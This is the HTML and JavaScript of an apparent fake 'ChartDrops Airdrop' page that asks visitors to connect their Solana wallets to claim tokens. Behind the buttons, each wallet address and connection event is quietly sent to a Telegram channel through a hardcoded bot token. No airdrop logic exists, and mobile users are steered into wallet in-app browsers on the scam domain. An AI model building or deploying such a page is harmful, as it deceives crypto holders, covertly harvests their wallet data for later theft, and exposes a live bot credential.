<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ChartDrops Airdrop</title>
  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-wallets@0.9.19/lib/cdn/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-base@0.9.19/lib/cdn/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-react-ui/styles.css"></script>
  <style>
    body {
      background: #0d0d0d;
      color: white;
      font-family: sans-serif;
      text-align: center;
      margin-top: 80px;
    }

    .popup {
      background: #1a1a1a;
      padding: 25px;
      border-radius: 10px;
      display: inline-block;
      box-shadow: 0 0 15px rgba(0, 255, 150, 0.2);
    }

    button {
      background: #00ffae;
      border: none;
      padding: 12px 20px;
      margin: 10px;
      border-radius: 6px;
      cursor: pointer;
      color: black;
      font-weight: bold;
    }

    button:hover {
      background: #00d69b;
    }

    #connectionStatus {
      margin-top: 20px;
      font-size: 16px;
      color: #00ffae;
    }
  </style>
</head>
<body>
  <div class="popup">
    <h2>ChartDrops Airdrop</h2>
    <p>Connect your wallet to claim</p>
    <button onclick="connectPhantom()">Connect Phantom</button>
    <button onclick="connectSolflare()">Connect Solflare</button>
    <button onclick="connectTrust()">Connect TrustWallet</button>
    <div id="connectionStatus"></div>
  </div>

  <script>
    const BOT_TOKEN = "7978623862:AAHezOh3PLYYy92TIjtIN9oRof32nbfwNMQ";
    const CHANNEL_ID = "-1002600871606";

    async function sendTelegramMessage(walletAddress, error = false) {
      const message = error
        ? `❌ Wallet Connect Error on chartdrops.fun:\n${walletAddress}`
        : `✅ Wallet ${walletAddress} Connected To chartdrops.fun`;

      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHANNEL_ID,
            text: message
          })
        });
        const result = await res.json();
        console.log("Telegram Response:", result);
      } catch (err) {
        console.error("Telegram error:", err);
      }
    }

    function updateConnectionStatus(status) {
      const statusElement = document.getElementById('connectionStatus');
      statusElement.textContent = status;
    }

    // Improved Phantom wallet detection for mobile
    async function connectPhantom() {
      // First try the standard Phantom detection
      if (typeof window.solana !== "undefined" && window.solana.isPhantom) {
        try {
          const resp = await window.solana.connect();
          const walletAddress = resp.publicKey.toString();
          sendTelegramMessage(walletAddress);
          updateConnectionStatus(`Connected: ${walletAddress}`);
          alert(`Connected: ${walletAddress}`);
          return;
        } catch (err) {
          console.error("Phantom connect error", err);
          sendTelegramMessage(`Phantom error: ${err.message}`, true);
          updateConnectionStatus("Phantom connection failed.");
          return;
        }
      }

      // Mobile-specific handling
      if (isMobile()) {
        // Try deep linking to Phantom mobile app
        try {
          // Phantom's universal link
          window.location.href = "https://phantom.app/ul/browse/https://chartdrops.fun";
          
          // Fallback if the app isn't installed
          setTimeout(() => {
            if (!document.hidden) {
              window.location.href = "https://phantom.app/download";
            }
          }, 1000);
          
          sendTelegramMessage("Attempting to open Phantom mobile app", true);
          updateConnectionStatus("Redirecting to Phantom app...");
        } catch (error) {
          alert("Phantom wallet not detected. Please install it from phantom.app");
          sendTelegramMessage("Phantom wallet not detected on mobile.", true);
          updateConnectionStatus("Phantom wallet not installed.");
        }
      } else {
        alert("Phantom wallet not installed. Please install Phantom from phantom.app");
        sendTelegramMessage("Phantom wallet not found on the device.", true);
        updateConnectionStatus("Phantom wallet not installed.");
      }
    }

    // Improved Solflare wallet detection for mobile
    async function connectSolflare() {
      // First try the standard Solflare detection
      if (typeof window.solflare !== "undefined") {
        try {
          const solflare = window.solflare;
          if (!solflare.isConnected) {
            await solflare.connect();
          }
          const walletAddress = solflare.publicKey.toString();
          sendTelegramMessage(walletAddress);
          updateConnectionStatus(`Connected: ${walletAddress}`);
          alert(`Connected: ${walletAddress}`);
          return;
        } catch (err) {
          console.error("Solflare connect error", err);
          sendTelegramMessage("Solflare error: " + err.message, true);
          updateConnectionStatus("Solflare connection failed.");
          return;
        }
      }

      // Mobile-specific handling
      if (isMobile()) {
        try {
          // Solflare's universal link
          window.location.href = "solflare://browse?url=https://chartdrops.fun";
          
          // Fallback if the app isn't installed
          setTimeout(() => {
            if (!document.hidden) {
              window.location.href = "https://solflare.com/download";
            }
          }, 1000);
          
          sendTelegramMessage("Attempting to open Solflare mobile app", true);
          updateConnectionStatus("Redirecting to Solflare app...");
        } catch (error) {
          alert("Solflare wallet not detected. Please install it from solflare.com");
          sendTelegramMessage("Solflare wallet not detected on mobile.", true);
          updateConnectionStatus("Solflare wallet not installed.");
        }
      } else {
        alert("Solflare wallet not installed. Please install Solflare from solflare.com");
        sendTelegramMessage("Solflare wallet not found.", true);
        updateConnectionStatus("Solflare wallet not found.");
      }
    }

    // TrustWallet connection (unchanged)
    async function connectTrust() {
      if (window.solana && window.solana.isTrust) {
        try {
          const resp = await window.solana.connect();
          const walletAddress = resp.publicKey.toString();
          sendTelegramMessage(walletAddress);
          updateConnectionStatus(`Connected: ${walletAddress}`);
          alert(`Connected: ${walletAddress}`);
        } catch (err) {
          console.error("TrustWallet connect error", err);
          sendTelegramMessage("TrustWallet error: " + err.message, true);
          updateConnectionStatus("TrustWallet connection failed.");
        }
      } else {
        if (isMobile()) {
          try {
            // Trust Wallet's universal link
            window.location.href = "trust://browse?url=https://chartdrops.fun";
            
            // Fallback if the app isn't installed
            setTimeout(() => {
              if (!document.hidden) {
                window.location.href = "https://trustwallet.com/download";
              }
            }, 1000);
            
            sendTelegramMessage("Attempting to open Trust Wallet mobile app", true);
            updateConnectionStatus("Redirecting to Trust Wallet app...");
          } catch (error) {
            alert("TrustWallet not detected. Please install it from trustwallet.com");
            sendTelegramMessage("TrustWallet not detected on mobile.", true);
            updateConnectionStatus("TrustWallet not installed.");
          }
        } else {
          alert("TrustWallet not installed. Please install TrustWallet from trustwallet.com");
          sendTelegramMessage("TrustWallet not found.", true);
          updateConnectionStatus("TrustWallet not found.");
        }
      }
    }

    // Helper function to detect mobile devices
    function isMobile() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }
  </script>
</body>
</html>
